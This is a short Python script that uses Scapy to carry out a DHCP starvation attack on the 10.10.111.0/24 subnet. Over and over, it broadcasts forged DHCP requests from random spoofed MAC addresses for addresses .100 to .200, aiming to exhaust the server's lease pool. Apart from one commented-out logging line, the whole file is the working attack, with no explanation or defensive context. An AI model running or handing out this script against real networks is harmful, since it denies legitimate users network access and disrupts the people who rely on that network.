#from logging import getLogger, ERROR
#getLoggger("scapy.runtime").setLevel(ERROR)

from scapy.all import *
import sys
import os

ip_addr_subnet = "10.10.111."

def attack_dhcp_server():
	for eachip in range(100,201):
		for i in range(0,8):
			fake_mac_addr = RandMAC()
			ether = Ether(dst="ff:ff:ff:ff:ff:ff" ,src=fake_mac_addr, type=0x800)
			ip = IP(src = '0.0.0.0', dst = '10.10.111.255')
			udp = UDP(sport=68, dport=67)
			bootp = BOOTP(chaddr = fake_mac_addr)
			dhcp = DHCP(options=[("message-type","request"), ("server_id","10.10.111.1"), ("requested_addr", ip_addr_subnet + str(eachip)), "end"])
			dhcp_request_pkt = ether/ip/udp/bootp/dhcp 	
			#print dhcp_request_pkt
			sendp(dhcp_request_pkt)
			time.sleep(1)

if __name__=="__main__":
	
	attack_dhcp_server();


